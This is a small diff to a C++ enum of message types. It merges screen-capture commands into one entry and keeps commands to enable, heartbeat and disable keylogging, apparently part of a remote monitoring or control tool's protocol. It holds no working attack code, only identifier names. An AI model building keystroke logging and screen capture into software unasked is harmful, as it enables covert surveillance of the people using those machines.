@@ -7,9 +7,7 @@ using json = nlohmann::json;
 
 enum MessageEnum {
     MessageRawText,
-    MessageEnableScreenCap,
-    MessageHeartbeatScreenCap,
-    MessageDisableScreenCap,
+    MessageScreenCap,
     MessageEnableKeylog,
     MessageHeartbeartKeylog,
     MessageDisableKeylog,
